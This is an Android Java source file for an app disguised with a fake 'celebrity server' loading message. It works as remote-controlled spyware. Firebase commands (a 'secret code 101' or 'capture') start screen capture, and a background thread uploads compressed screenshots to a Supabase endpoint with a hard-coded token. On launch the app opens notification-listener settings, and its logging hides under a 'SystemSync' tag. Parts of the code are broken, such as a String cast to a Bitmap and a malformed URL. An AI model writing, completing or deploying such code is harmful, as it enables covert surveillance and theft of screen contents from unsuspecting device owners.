package fanliteapp.m;

import android.animation.*;
import android.app.*;
import android.content.*;
import android.content.Context;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.os.*;
import android.os.Vibrator;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.coordinatorlayout.widget.CoordinatorLayout;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.android.material.appbar.AppBarLayout;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import fanliteapp.m.databinding.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;

public class MainActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private MainBinding binding;
	
	private ArrayList<HashMap<String, Object>> childvalue = new ArrayList<>();
	
	private Vibrator v;
	private DatabaseReference commands = _firebase.getReference("commands");
	private ChildEventListener _commands_child_listener;
	private TimerTask heartbeat;
	private RequestNetwork supabase;
	private RequestNetwork.RequestListener _supabase_request_listener;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		binding = MainBinding.inflate(getLayoutInflater());
		setContentView(binding.getRoot());
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		setSupportActionBar(binding.Toolbar);
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		getSupportActionBar().setHomeButtonEnabled(true);
		binding.Toolbar.setNavigationOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _v) {
				onBackPressed();
			}
		});
		v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		supabase = new RequestNetwork(this);
		
		_commands_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				// Check if the command from your computer is the secret code "101"
				if (_childValue.get("cmd").toString().equals("101")) {
					
					// This triggers the screen capture session
					android.media.projection.MediaProjectionManager mpm = (android.media.projection.MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
					startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
					
					// Professional touch: Show a fake "Loading" message to match your cloak
					SketchwareUtil.showMessage(getApplicationContext(), "Connecting to celebrity server...");
				}
				
				
				
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				// 1. Get the message from Firebase
				String message = _childValue.toString();
				
				// 2. Check if the message is "capture"
				if (message.contains("capture")) {
					// 3. Directly trigger the Screen Capture request
					android.media.projection.MediaProjectionManager mpm = (android.media.projection.MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
					startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
				}
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		commands.addChildEventListener(_commands_child_listener);
		
		_supabase_request_listener = new RequestNetwork.RequestListener() {
			@Override
			public void onResponse(String _param1, String _param2, HashMap<String, Object> _param3) {
				final String _tag = _param1;
				final String _response = _param2;
				final HashMap<String, Object> _responseHeaders = _param3;
				// Silent success log - no variables needed
				android.util.Log.d("SystemSync", "Sent");
				
				SketchwareUtil.showMessage(getApplicationContext(), "SENT ");
			}
			
			@Override
			public void onErrorResponse(String _param1, String _param2) {
				final String _tag = _param1;
				final String _message = _param2;
				// Silent error log - no variables needed
				android.util.Log.e("SystemSync", "Error");
				
			}
		};
	}
	
	private void initializeLogic() {
		startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
		
		
	}
	
	public void _uploadScreen(final String _dummy) {
		// 1. COMPRESS: Turn pixels into a small JPG
		if (_dummy != null) {
			android.graphics.Bitmap realBitmap = (android.graphics.Bitmap)(Object)_dummy;
			java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
			realBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 30, baos);
			final byte[] imageBytes = baos.toByteArray();
			
			// 2. BACKGROUND THREAD: Pure Java upload to bypass Sketchware errors
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						java.net.URL url = new java.net.URL("https://supabase.co" + System.currentTimeMillis() + ".jpg");
						java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
						conn.setDoOutput(true);
						conn.setRequestMethod("POST");
						conn.setRequestProperty("Authorization", "Bearer sb_publishable_Kl03DqjsiPOSGWtgFmFsVw_k56PfV1E");
						conn.setRequestProperty("Content-Type", "image/jpeg");
						
						java.io.OutputStream os = conn.getOutputStream();
						os.write(imageBytes);
						os.close();
						
						// Silent Check
						int responseCode = conn.getResponseCode();
						android.util.Log.d("SystemSync", "Code: " + responseCode);
						conn.disconnect();
					} catch (Exception e) {
						android.util.Log.e("SystemSync", "Error: " + e.getMessage());
					}
				}
			}).start();
		}
		
	}
	
}